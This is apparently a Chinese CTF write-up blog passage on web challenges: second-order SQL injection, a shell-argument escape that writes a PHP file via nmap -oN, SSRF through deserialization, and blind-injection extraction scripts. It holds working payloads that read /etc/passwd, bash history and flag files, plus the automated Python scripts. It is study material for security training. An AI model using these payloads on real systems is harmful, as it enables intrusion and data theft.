<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>海星，比起某些代码要好审计的多，代码逻辑：此文件大概有两个功能第一个写文件，插入<code>title,content,category</code>到board表中,并且经过了转义函数过滤，第二个功能，先通过bo_id去判断一下，看有没有这个内容，有的话，接着写内容插入到<code>comment</code>表中，但是这里出现问题了，直接从数组里拿出来我们的<code>category</code>，导致二次注入。</p>
<p>这里有一个很坑的点..(应该说是没遇到过的点)，这个insert是换行的，没法多行注释，也就是没法用<code>#</code>直接将后面所有的都注释掉。平时我们操作的insert注入大概就是如下形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into table_name(&#96;xx&#96;,&#96;xx&#96;) values (&#39;xx&#39;,&#39;xx&#39;)</span><br></pre></td></tr></table></figure>

<p>如果我们想要注入的话直接控制第一个xx，为<code>&#39;,user())#</code>直接就可以造成注入，但是这个明显不行了，把这个句子单拿出来看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br></pre></td></tr></table></figure>

<p>这里是有换行操作的，所以不能通过<code>#</code>直接将后面的注释掉，需要这样操作<code>category</code>为<code>&#39;,content=user(),/*</code>,content为<code>*/#</code>，即可完成注入，（之所以要在content上注入是因为content内容才会显示出来。</p>
<p>接下来的payload，我搜索了一下数据库为ctf，发现并没有flag。接着读取了一下<code>/etc/passwd</code>，发现www用户，读取一下bash_history.</p>
<p><code>&#39;,content=(select load_file(&#39;/home/www/.bash_history&#39;)),/*</code></p>
<p>发现<code>DS_Store</code>文件，因为是docker下的，所以可以文件在<code>/tmp/html/.DS_Store</code>,读取一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>用hex编码来解决不可见字符，最后发现flag在<strong>flag_8946e1ff1ee3e40f.php</strong>，同样操作读取，获得flag。</p>
<h3 id="Online-tools"><a href="#Online-tools" class="headerlink" title="Online-tools"></a>Online-tools</h3><p>最后就是要说的<code>escapeshellarg与escapeshellcmd</code>函数导致的单引号逃逸问题了，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个Nmap扫描操作，这道题自己一直卡在怎么逃逸出 <code>|， &amp;</code>之类的字符，却忽略了本身nmap的参数问题，真是沙雕。</p>
<p>还是先来两张图明白一下所带来的安全问题</p>
<p><code>escapeshellarg</code>是首先给传递进来的字符两边加个单引号，如过字符串中包含单引号，先转义，两边再各自添加个单引号。</p>
<p><code>escapeshellcmd</code>就是转义危险字符，使得只执行一个命令。例子如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$param = <span class="string">"172.17.0.2' -v -d a=1"</span>;</span><br><span class="line">$ep = escapeshellarg($param);</span><br><span class="line">$eep = escapeshellcmd($ep);</span><br><span class="line">$cmd = <span class="string">"curl "</span>.$eep;</span><br><span class="line"><span class="keyword">echo</span> $ep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $eep.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $cmd.<span class="string">"\n"</span>;</span><br><span class="line">system($cmd);</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">'</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span><span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">* Rebuilt URL to: 172.17.0.2\/</span></span><br></pre></td></tr></table></figure>

<p>最终分为<code>172.17.0.2\</code>  , <code></code>，<code>-v -d a=1&#39;</code>，问题出现在<code>escapeshellcmd</code>，只会转义单个的单引号，不会转义成对的双引号，所以将<code>\</code>转义掉，造成单引号逃逸。再来看着这道题</p>
<p>PS:nmap -oN选项表示将输出导入到文件中</p>
<p>所以构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">' &lt;?php phpinfo();?&gt; -oN shell.php '</span></span><br></pre></td></tr></table></figure>

<p>经过第一次处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>   \<span class="string">'    '</span> <span class="meta">&lt;?php</span> phpninfo();<span class="meta">?&gt;</span> -oN shell .php <span class="string">' \' '</span><span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>第二次</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">''</span>   \\ <span class="string">''</span> \&lt;\?php phpinfo\(\)\;\?\? -oN shell.php <span class="string">'\\ '</span><span class="string">''</span></span><br></pre></td></tr></table></figure>

<p>最终成功绕过写入<code>phpinfo()</code>。</p>
<h3 id="Facebook"><a href="#Facebook" class="headerlink" title="Facebook"></a>Facebook</h3><p>首先扫了一下，发现<code>user.php.bak</code>，题目有两个功能一个是join，一个是login，在join的时候发现是有填写博客地址的，怀疑有<code>SSRF</code>。泄露代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然是存在SSRF的，不过注册的时候似乎不能直接SSRF,因为是有过滤操作的。然后发现有<code>no=1</code>的操作，尝试注入，过滤掉了<code>0x</code>，似乎不能用传统的报错注入操作了，不过可以换成<code>makeset</code>操作。</p>
<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)</span><br></pre></td></tr></table></figure>

<p>(XPATH syntax error: ‘~,users’)</p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 and updatexml(1,make_set(3,%27~%27,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)),1)</span><br></pre></td></tr></table></figure>

<p>(XPATH syntax error: ‘~,no,username,passwd,data,USER,C’)</p>
<p>爆一下<code>data</code>的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(XPATH syntax error: &#39;~,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:9:&quot;lihuaiqiu&quot;;s:3:&quot;age&quot;;i:11；s:4:&quot;blog&quot;;s:21:&quot;https:&#x2F;&#x2F;www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现储存的是用户的反序列化信息，<strong>所以可以想到，可以通过union进去一个反序列化数据达到SSRF的目的，这样就能绕过join处对博客网址的检测。</strong></p>
<p>似乎对<code>union select</code>做了检测，利用注释符<code>union/**/select</code>绕过，<code>no=-1</code>把其他信息扔掉。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;2&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:28:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>成功打出flag经过base64加密后的字符串</p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhaGz8.png" alt="ZhaGz8.png"></p>
<p>解密后即为flag。</p>
<h3 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h3><p>一个二次注入题，通过这道题..，发现自己注入好菜…，注入点在login的<code>username</code>，并且是闭合单引号类型的注入。测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload:&#39; or (case when 1&#x3D;1 then sleep(3) else &#39;2&#39; end)&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>成功延时3s。</p>
<p>这里的脚本就很迷啊，先贴一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url= <span class="string">"http://web24.buuoj.cn/register.php"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"abcdefghijklnmopqrsduvwxyz"</span>+<span class="string">"&#123;"</span>+<span class="string">"&#125;"</span>:</span><br><span class="line">        payload=<span class="string">"' or (case when mid((select * from flag)from(&#123;&#125;)for(1))='&#123;&#125;' then sleep(3) else '2' end)='1"</span>.format(a,i)</span><br><span class="line">        da=&#123;<span class="string">"email"</span>:<span class="string">'1@111'</span>,</span><br><span class="line">            <span class="string">"username"</span>:payload,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"11"</span>&#125;</span><br><span class="line">        <span class="comment">#print(db_payload)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url,data=da,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://s2.ax1x.com/2019/07/13/Zhd379.png" alt="Zhd379.png"></p>
<p>跑出来的字符很有问题..可能是网络影响盲注的问题吧。</p>
<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>两次hex,payload如下，新学到了一个姿势</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&#39;+(select hex(hex(database())))+&#39;0</span><br></pre></td></tr></table></figure>

<p>为什么两次hex的原因如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhRdjs.png" alt="ZhRdjs.png"></p>
<p><strong>如果字符是<code>flag{}</code>这种形式的，那么第一次Hex是可能会出现字母的，这时与<code>&#39;0&#39;</code>相加后的结果就会把字符舍弃，不符合愿意，所以要进行两次Hex。</strong></p>
<p>这种方法还存在着精度丢失的问题，也就是上面的科学计数法。所以解决的办法就是尽量取出尽可能少的字符个数进行相加。vk师傅应该就是这么做的，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="comment">#!/usr/bin/env python2*</span></span><br><span class="line"><span class="number">2.</span> *<span class="comment"># -\*- coding:utf-8 -\*-*</span></span><br><span class="line"><span class="number">3.</span> </span><br><span class="line"><span class="number">4.</span> <span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="number">5.</span> <span class="keyword">import</span> random</span><br><span class="line"><span class="number">6.</span> <span class="keyword">import</span> sys</span><br><span class="line"><span class="number">7.</span> </span><br><span class="line"><span class="number">8.</span> URL = <span class="string">'http://99836af07612423cb83b84745ccd56dcd11ede0687854475.game.ichunqiu.com'</span></span><br><span class="line"><span class="number">9.</span> </span><br><span class="line"><span class="number">10.</span> </span><br><span class="line"><span class="number">11.</span> <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line"><span class="number">12.</span> ​    data = &#123;</span><br><span class="line"><span class="number">13.</span> ​        <span class="string">"email"</span>: email,</span><br><span class="line"><span class="number">14.</span> ​        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line"><span class="number">15.</span> ​    &#125;</span><br><span class="line"><span class="number">16.</span> ​    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line"><span class="number">17.</span> ​    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1 '</span> <span class="keyword">in</span> res.content:</span><br><span class="line"><span class="number">18.</span> ​        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="number">19.</span> ​    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> </span><br><span class="line"><span class="number">22.</span> <span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line"><span class="number">23.</span> ​    data = &#123;</span><br><span class="line"><span class="number">24.</span> ​        <span class="string">"username"</span>: u,</span><br><span class="line"><span class="number">25.</span> ​        <span class="string">"email"</span>: e,</span><br><span class="line"><span class="number">26.</span> ​        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line"><span class="number">27.</span> ​    &#125;</span><br><span class="line"><span class="number">28.</span> ​    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="number">29.</span> ​    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line"><span class="number">30.</span> ​        <span class="keyword">return</span> login(e)</span><br><span class="line"><span class="number">31.</span> ​    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">32.</span> table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"><span class="number">33.</span> </span><br><span class="line"><span class="number">34.</span> </span><br><span class="line"><span class="number">35.</span> <span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line"><span class="number">36.</span> ​    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line"><span class="number">37.</span> ​    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"><span class="number">38.</span> </span><br><span class="line"><span class="number">39.</span> </span><br><span class="line"><span class="number">40.</span> <span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line"><span class="number">41.</span> ​    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line"><span class="number">42.</span> ​    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line"><span class="number">43.</span> ​        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line"><span class="number">44.</span> ​        sys.stdout.flush()</span><br><span class="line"><span class="number">45.</span> ​        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line"><span class="number">46.</span> ​            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line"><span class="number">47.</span> ​            <span class="keyword">return</span> i</span><br><span class="line"><span class="number">48.</span> ​    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="number">49.</span> </span><br><span class="line"><span class="number">50.</span> </span><br><span class="line"><span class="number">51.</span> <span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line"><span class="number">52.</span> ​    _len = getLen(sql)</span><br><span class="line"><span class="number">53.</span> ​    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line"><span class="number">54.</span> ​        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line"><span class="number">55.</span> ​        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="number">56.</span> ​    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line"><span class="number">57.</span> ​    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line"><span class="number">58.</span> ​    res = <span class="string">''</span></span><br><span class="line"><span class="number">59.</span> ​    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line"><span class="number">60.</span> ​        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line"><span class="number">61.</span> ​            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line"><span class="number">62.</span> ​            sys.stdout.flush()</span><br><span class="line"><span class="number">63.</span> ​            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line"><span class="number">64.</span> ​             sql, pos, ch)</span><br><span class="line"><span class="number">65.</span> ​            <span class="keyword">if</span> b(pl):</span><br><span class="line"><span class="number">66.</span> ​                res += ch</span><br><span class="line"><span class="number">67.</span> ​                <span class="keyword">break</span></span><br><span class="line"><span class="number">68.</span> ​    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line"><span class="number">69.</span> ​    <span class="keyword">return</span> res</span><br><span class="line"><span class="number">70.</span> </span><br><span class="line"><span class="number">71.</span> *<span class="comment"># right(left(x,pos),1)*</span></span><br><span class="line"><span class="number">72.</span> *<span class="comment"># mid(x,pos,1)*</span></span><br><span class="line"><span class="number">73.</span> <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="number">74.</span> ​    *<span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'*</span></span><br><span class="line"><span class="number">75.</span> ​    *<span class="comment"># pl = "1'and(%s)and'1" % pl*</span></span><br><span class="line"><span class="number">76.</span> ​    *<span class="comment"># print(b(pl))*</span></span><br><span class="line"><span class="number">77.</span> ​    pl = <span class="string">'version()'</span></span><br><span class="line"><span class="number">78.</span> ​    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line"><span class="number">79.</span> ​    getData(pl)</span><br></pre></td></tr></table></figure>

<h3 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h3><p>本来以为这道题只有docker的，后来发现在平台也是有的，白弄了好久。这道题在下载文件处存在任意文件读取，读取到的源代码如下：</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;store_result();</span><br><span class="line">    $count = $stmt-&gt;num_rows;</span><br><span class="line">    <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">    $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;bind_result($expect);</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">    $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">  